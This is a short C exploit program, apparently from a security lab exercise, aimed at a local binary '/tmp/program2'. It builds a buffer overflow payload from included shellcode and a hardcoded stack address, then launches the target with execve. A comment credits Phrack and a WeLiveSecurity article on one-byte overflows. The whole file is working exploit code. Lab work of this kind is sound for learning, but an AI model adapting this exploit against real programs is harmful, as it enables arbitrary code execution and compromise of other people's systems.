#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "/tmp/program2"

/*
I do not understand how the method introduced in phrack megazine works (http://phrack.org/issues/55/8.html)
But I borrowed the idea from https://www.welivesecurity.com/2016/05/10/exploiting-1-byte-buffer-overflows/
*/

int main(void)
{
  char *args[3];
  char *environ[1];
  char exploit_string[200];
  for (int i = 0; i < 200; i++) {
        exploit_string[i] = 'A';
  }

  for (int i = 5, j = 0; j < strlen(shellcode); i++, j++) {
        exploit_string[i] = shellcode[j];
  }

  exploit_string[54] = 0x14;
  exploit_string[55] = 0xdd;
  exploit_string[56] = 0xff;
  exploit_string[57] = 0xff;

  args[0] = PROGRAM;
  args[1] = exploit_string;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
